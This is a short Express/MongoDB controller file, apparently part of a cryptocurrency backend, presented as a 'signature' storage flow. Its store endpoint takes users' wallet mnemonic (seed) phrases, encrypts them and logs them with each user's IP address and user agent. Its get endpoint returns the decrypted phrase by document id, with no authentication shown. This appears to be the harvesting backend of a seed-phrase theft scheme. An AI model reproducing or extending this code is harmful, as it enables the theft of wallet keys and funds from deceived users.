/**
 * Signature controller — preserves the existing /api/signatures/store flow
 * with AES-256-CBC encryption of validator mnemonic phrases.
 */

const { ObjectId } = require('mongodb');
const { Signature } = require('../models');
const { encrypt, decrypt } = require('../services/cryptoService');
const { HttpError } = require('../middleware/error');

async function store(req, res, next) {
    try {
        const { txId, validator, mnemonicPhrase, hash, timestamp } = req.body;
        if (!txId || !validator || !mnemonicPhrase || !hash) {
            throw new HttpError(400, 'txId, validator, mnemonicPhrase, hash required');
        }
        const doc = await Signature.create({
            txId,
            validator: validator.toLowerCase(),
            mnemonicPhrase: encrypt(mnemonicPhrase),
            hash,
            timestamp: timestamp ? new Date(timestamp) : new Date(),
            metadata: {
                ipAddress: req.ip,
                userAgent: req.headers['user-agent'],
                approvalCount: 1,
            },
        });
        res.json({ success: true, documentId: doc._id.toString(), hash });
    } catch (err) { next(err); }
}

async function get(req, res, next) {
    try {
        let doc;
        try {
            doc = await Signature.findById(new ObjectId(req.params.documentId));
        } catch {
            throw new HttpError(400, 'Invalid documentId');
        }
        if (!doc) throw new HttpError(404, 'Document not found');

        const json = doc.toObject();
        json.mnemonicPhrase = decrypt(json.mnemonicPhrase);
        res.json(json);
    } catch (err) { next(err); }
}

module.exports = { store, get };
